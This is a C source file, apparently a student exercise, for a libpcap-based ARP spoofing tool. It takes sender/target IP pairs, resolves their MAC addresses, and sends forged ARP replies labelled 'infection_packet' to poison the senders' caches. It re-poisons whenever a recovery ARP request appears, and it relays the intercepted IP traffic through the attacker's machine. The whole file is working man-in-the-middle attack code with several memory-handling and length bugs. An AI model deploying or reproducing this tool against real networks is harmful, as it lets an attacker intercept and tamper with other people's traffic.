#include <pcap.h>
#include "headers.h"
#include "initial.h"

int main(int argc, char* argv[])
{
	// for for.
    int i = 0;
    bool flag = false;
    int tmp;

    //for structure include s_ip, s_mac, t_ip, t_mac.
    struct session sessions[argc - 2];

    //initialize things need.
    uint8_t attacker_mac[6];
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t zero_mac[6] = {0, 0, 0, 0, 0, 0};
    uint32_t zero_ip = 0;

    //for pcap.
    struct pcap_pkthdr* header;
    const u_char* packet;
    const u_char* infection_packet[argc - 2];
    char* buf[256];
    int res;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(!handle)
    {
    	fprintf(stderr, "[-] couldn't open device %s: %s\n", dev, errbuf);
    	return -1;
    }

    //retype ip address.
    for(i = 2; i < argc; i += 2)
    {
        ip_retype(argv[i],&sessions[(i / 2) - 1].sender_ip);
        ip_retype(argv[i + 1],&sessions[(i / 2) - 1].target_ip);
    	printf("[+] %d : sender ip : %8x\n", i / 2, sessions[((i / 2) - 1)].sender_ip);
    	printf("[+] %d : target ip : %8x\n", i / 2, sessions[((i / 2) - 1)].target_ip);
    }

    //get my mac address.
    get_my_mac(attacker_mac, argv[1]);
    printf("[+] my mac = %02x:%02x:%02x:%02x:%02x:%02x\n",attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);

    //get all sessions sender mac address.
    for(i = 0; i < (argc - 2) / 2; i++)
    {
        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, &zero_ip, zero_mac, &sessions[i].sender_ip);
    	pcap_sendpacket(handle, packet, 42);
    	while(true)
    	{
        	res = pcap_next_ex(handle, &header, &packet);
        	if (res == 0) continue;
        	if (res == -1 || res == -2) break;

       	 	struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
        	eth = (struct ethernet_hdr*)packet;
        	struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
       	 	arp = (struct arp_hdr*)(packet + 14);
        	if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].sender_ip & 0xff)
        	{
            	for(int j = 0; j < 6; j++)
           		{
                	sessions[i].sender_mac[j] = arp->S_hardware_addr[j];
                	printf("[+] %d : sender_mac set clear\n", i);
            	}
            	break;
        	}
        free(&packet);
        free(eth);
        free(arp);
    	}
    }

    //get all sessions target mac address.
    for(i = 0; i < (argc - 2) / 2; i++)
    {
        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, &zero_ip, zero_mac, &sessions[i].target_ip);
    	pcap_sendpacket(handle, packet, 42);
    	while(true)
    	{
        	res = pcap_next_ex(handle, &header, &packet);
        	if (res == 0) continue;
        	if (res == -1 || res == -2) break;

       	 	struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
        	eth = (struct ethernet_hdr*)packet;
        	struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
       	 	arp = (struct arp_hdr*)(packet + 14);
        	if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].target_ip & 0xff)
        	{
            	for(int j = 0; j < 6; j++)
           		{
                	sessions[i].target_mac[j] = arp->S_hardware_addr[j];
                	printf("[+] %d : target_mac set clear\n", i);
            	}
            	break;
        	}
        free(&packet);
        free(eth);
        free(arp);
    	}
    }

    for(i = 0; i < (argc - 2) / 2; i++)
    {
        infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].sender_mac, attacker_mac, &sessions[i].target_ip, sessions[i].sender_mac, &sessions[i].sender_ip);
    	pcap_sendpacket(handle, infection_packet[i], 42);
    	printf("[+] infection_packet for session no.%d is sendedn", i);
    }

    while(true)
    {
        res = pcap_next_ex(handle, &header, &packet);
    	if (res == 0)
    		continue;
    	if (res == -1 || res == -2)
    		break;

    	struct ethernet_hdr* eth = (struct ethernet_hdr*)malloc(14);
    	eth = (struct ethernet_hdr*)packet;

    	if(eth -> ether_type == 0x0080)
    	{
    		struct ip_hdr* l3_hdr = (struct ip_hdr*)malloc(20);
    		l3_hdr = (struct ip_hdr*)(packet + 14);

    		flag = false;
    		for(i = 0; i < (argc - 2) / 2; i++)
    		{
    			if(l3_hdr -> S_ip == sessions[i].sender_ip)
    			{
    				flag = true;
    				tmp = i;
    				break;
    			}
    		}
    		if(flag)
    		{
    			for(i = 0; i < 6; i++)
    			{
    				eth -> ether_smac[i] = attacker_mac[i];
    				eth -> ether_dmac[i] = sessions[tmp].target_mac[i];
    			}
    		}
    		pcap_sendpacket(handle, packet, 34);
    	}
    	else if(eth -> ether_type == 0x0608)
    	{
    		struct arp_hdr* l3_hdr = (struct arp_hdr*)malloc(28);
    		l3_hdr = (struct arp_hdr*)(packet + 14);
    		if(!memcmp(l3_hdr -> T_hardware_addr, broadcast_mac, 6))
    		{
    			flag = false;
    			for(i = 0; i < (argc - 2) / 2; i++)
    			{
    				if(l3_hdr -> T_protocol_addr[3] == sessions[i].target_ip & 0xff && l3_hdr -> Opcode == REQUEST)
    				{
    					flag = true;
    					tmp = i;
    					break;
    				}
    			}
    			if(flag)
    				pcap_sendpacket(handle, infection_packet[tmp], 42);

    		}
    		if(!memcmp(l3_hdr -> T_hardware_addr, attacker_mac, 6))
    		{
    			flag = false;
    			for(i = 0; i < (argc - 2) / 2; i++)
    			{
    				if(l3_hdr -> T_protocol_addr[3] == sessions[i].target_ip & 0xff && l3_hdr -> Opcode == REQUEST)
    				{
    					flag = true;
    					tmp = i;
    					break;
    				}
    			}
    			if(flag)
    				pcap_sendpacket(handle, infection_packet[tmp], 42);
    		
    		}
    	}
    }
	return 0;
}
